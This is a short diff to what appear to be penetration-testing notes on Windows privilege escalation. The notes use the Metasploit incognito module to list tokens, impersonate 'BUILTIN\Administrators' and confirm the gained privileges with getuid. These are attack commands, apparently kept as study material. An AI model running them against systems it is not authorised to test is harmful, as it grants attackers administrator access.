@@ -14,9 +14,16 @@ if "SeImpersonatePrivilege" is there, we can exploit it.
 
 load incognito
 
-list_tokens -u --> shows available tokens 
+To list all available tokens:
 
-impersonate_token "<delegation token>" 
+```
+list_tokens -g
+```
+To impersonate a token
+
+```
+impersonate_token "BUILTIN\Administrators" 
+```
 
 getuid --> gained privs of <delegation token>
 
